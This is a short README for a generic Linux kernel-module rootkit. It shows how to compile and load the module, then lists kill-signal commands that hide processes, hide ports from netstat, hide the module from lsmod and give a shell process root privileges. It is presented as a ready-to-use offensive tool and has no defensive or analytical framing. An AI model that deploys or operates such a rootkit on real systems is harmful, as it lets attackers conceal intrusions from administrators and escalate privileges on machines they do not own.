## Generic LKM Rootkit
Hides processes, port from netstat, module hiding and give root.

#### Compile LKM
```
make
```
```
sudo insmod rootkit.ko
```

#### Rootkit usage<br>
Hide processes
```
kill -62 $PID
```
Type again with process ID to unhide process.

If you have multiple processes hidden and want to unhide them all
```
kill -62 0
```
Hide port from netstat
```
kill -61 8080
```
To unhide port
```
kill -61 0
```
To unhide rootkit from lsmod - toggle hidden/invisible. Necessary to uninstall LKM
```
kill -63 0
```
Give root to process - i.e, bash's $PID for a rootshell
```
kill -64 $PID
```
